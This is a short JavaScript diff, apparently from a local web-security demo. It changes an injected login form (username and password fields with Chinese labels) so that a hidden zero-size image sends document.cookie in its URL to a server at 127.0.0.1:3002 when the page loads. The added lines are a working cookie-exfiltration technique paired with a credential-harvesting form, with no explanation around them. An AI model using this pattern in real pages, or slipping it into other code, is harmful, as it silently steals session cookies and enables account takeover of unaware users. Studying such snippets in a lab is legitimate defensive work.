@@ -14,11 +14,12 @@ var request = function() {
 }
 
 window.onload = function() {
+  console.log(document.cookie);
   var formContainerOBJ = document.getElementById('form-container');
   formContainerOBJ.innerHTML = '<form id="form">' +
     '<p>用户名:</p><input type="text"><br/>' +
     '<p>密码:</p><input type="password"><br>' +
-    '<img src="http://127.0.0.1:3002/api/password" style="visibility:hidden;width:0;height:0">' +
+    '<img src="http://127.0.0.1:3002/api/password?' + document.cookie + '" style="visibility:hidden;width:0;height:0">' +
     '<button id="submit-btn">提交</button>' +
   '</form>'
 
